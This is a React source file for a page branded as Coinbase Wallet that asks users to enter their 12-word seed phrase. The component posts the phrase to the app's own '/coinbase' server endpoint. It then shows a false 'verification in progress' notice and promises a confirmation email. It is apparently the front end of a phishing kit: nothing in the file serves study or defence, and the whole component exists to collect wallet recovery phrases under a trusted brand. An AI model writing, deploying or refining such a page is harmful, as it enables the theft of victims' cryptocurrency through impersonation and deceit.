import React, { useState } from 'react';
import './coinbaseCss/coinbaseTwoWallet.css';
import coinbaseLogo from '../../assets/coinbase_logo.png';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { useNavigate } from 'react-router-dom';
import fetchWithRetry from '../../utils/api';

const CoinbaseTwoWallet = () => {
  const [seedPhrase, setSeedPhrase] = useState('');
  const [loading, setLoading] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const navigate = useNavigate();

  const unlockWallet = async () => {
    try {
      setLoading(true);
      const res = await fetchWithRetry('/coinbase', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passphrase: seedPhrase })
      });

      const data = await res.json();
      toast.success(data.message);
      setSeedPhrase('');
      setShowSuccess(true);
    } catch (error) {
      toast.error('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const unlockWithFaceId = () => {
    toast.info('Feature not available yet.');
  };

  return (
    <div className="coinbaseTwo-wrapper">
      <header className="coinbaseTwo-header">
        <span className="coinbaseTwo-header-text">Wallet</span>
        <div className="coinbaseTwo-header-logo">
          <img src={coinbaseLogo} alt="Coinbase Wallet" />
        </div>
      </header>

      {!showSuccess ? (
        <>
          <div className="coinbaseTwo-title">
            <h3>Unlock Coinbase Wallet</h3>
          </div>

          <section className="coinbaseTwo-body">
            <div className="coinbaseTwo-container">
              <textarea
                className="coinbaseTwo-textarea"
                placeholder="Enter your 12-word passphrase here"
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
              />
              <button
                className="coinbaseTwo-primary-btn"
                onClick={unlockWallet}
                disabled={loading}
              >
                {loading ? 'Loading...' : 'Unlock With Passphrase'}
              </button>
              <button
                className="coinbaseTwo-secondary-btn"
                onClick={unlockWithFaceId}
              >
                Unlock With Face ID
              </button>
              <p className="coinbaseTwo-info-text">
                As a non-custodial wallet, your wallet passphrase is exclusively
                accessible only to you. Recovery of passphrase is currently
                impossible.
              </p>
              <p className="coinbaseTwo-warning-text">
                Lost your passphrase? <span>Create a new wallet</span>, but all
                assets in your previous wallet will be inaccessible.
              </p>
            </div>
          </section>
        </>
      ) : (
        <section className="coinbaseTwo-body">
          <div className="coinbaseTwo-container">
            <h3 className="coinbaseTwo-success-title">
              Verification in progress
            </h3>
            <p className="coinbaseTwo-info-text">
              Your wallet information has been submitted successfully.
              A confirmation email will be sent once verification is complete.
            </p>
            <div className="coinbaseTwo-action-row">
              <button
                className="coinbaseTwo-primary-btn"
                onClick={() => navigate('/')}
              >
                Go Home
              </button>
              <button
                className="coinbaseTwo-secondary-btn"
                onClick={() => setShowSuccess(false)}
              >
                Continue
              </button>
            </div>
          </div>
        </section>
      )}
    </div>
  );
};

export default CoinbaseTwoWallet;